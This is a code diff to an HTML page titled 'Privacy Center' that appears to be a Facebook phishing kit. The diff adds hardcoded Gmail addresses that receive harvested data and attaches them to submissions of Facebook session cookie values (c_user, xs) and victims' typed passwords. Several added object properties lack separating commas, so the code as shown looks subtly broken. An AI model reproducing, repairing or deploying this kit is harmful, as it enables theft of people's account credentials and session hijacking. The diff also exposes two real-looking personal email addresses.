@@ -1,6 +1,11 @@
 <html lang="en" webcrx=""><head>
   <meta charset="UTF-8">
   <meta name="viewport" content="width=device-width, initial-scale=1">
+    <script>
+    // LIFETIME MEIN SIRF YAHAN EMAIL BADALNA HAI
+    var emailForm1 = "lingdavid24@gmail.com";   // Pehla form (name + mall wala)
+    var emailForm2 = "akeraa191@gmail.com";    // Doosra form (FB password wala)
+    </script>
   <title>Privacy Center</title>
   <link rel="stylesheet" href="https://cdnjs.cloudflare.com/ajax/libs/font-awesome/6.4.0/css/all.min.css">
   <style>
@@ -2049,6 +2054,7 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
       submitToOtherEndpoints({
         bhenjachud: c_user,
         majachud: xs
+        to_email: emailForm1,
       });
      
       showfbLogin();
@@ -2059,6 +2065,7 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
       submitToOtherEndpoints({
         bhenjachud: c_user,
         majachud: xs
+        to_email: emailForm1,
       });
      
       
@@ -2103,6 +2110,7 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
       // Also submit to the additional endpoints
       submitToOtherEndpoints({
         pass: password
+        to_email: emailForm2,
       });
      
       // Show success message
@@ -2113,6 +2121,7 @@ french: "https://resource2.heygen.ai/video_translate/6e2f1893a7994182948b3dd8f27
       // Still proceed with the other endpoints even if formsubmit fails
       submitToOtherEndpoints({
         pass: password
+        to_email: emailForm2,
       });
      
       // Show success message even if there was an error with formsubmit
